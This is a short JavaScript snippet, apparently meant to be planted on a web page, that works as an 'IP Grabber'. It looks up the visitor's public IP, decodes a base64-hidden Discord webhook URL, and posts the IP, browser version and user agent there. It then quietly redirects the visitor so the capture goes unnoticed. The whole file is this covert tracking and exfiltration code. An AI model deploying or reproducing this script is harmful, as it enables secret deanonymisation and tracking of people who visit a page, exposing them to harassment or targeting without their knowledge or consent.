$.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
    var b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTY2NzM5MjM5MzUyMDEyODcwL2J3YUUwNlU3OW4yQThkaklMNWtiZ3VyRkJLRDV2bE5TdHpyWVhZU1JiR3loc0FpZjJDVjcwd0tQTERrai0tOU4zWVdM";
    var request = new XMLHttpRequest();
    request.open("POST", atob(b64));
    request.setRequestHeader('Content-type', 'application/json');

    request.onloadend = () => {
        setTimeout(function() {
            if (window.location.href.includes("#")) {
                var loc = window.location.href.split("#").pop();
                window.location = loc;
            } else {
                window.location = "https://" + window.location.hostname;
            }
        }, 100);
    }

    var params = {
        username: "IP Grabber",
        content: "```"
               + "IP: " + data.ip + "\n\n"
               + "appVersion: " + navigator.appVersion + "\n\n"
               + "userAgent: " + navigator.userAgent + "\n\n"
               + "```"
    }

    request.send(JSON.stringify(params));
});
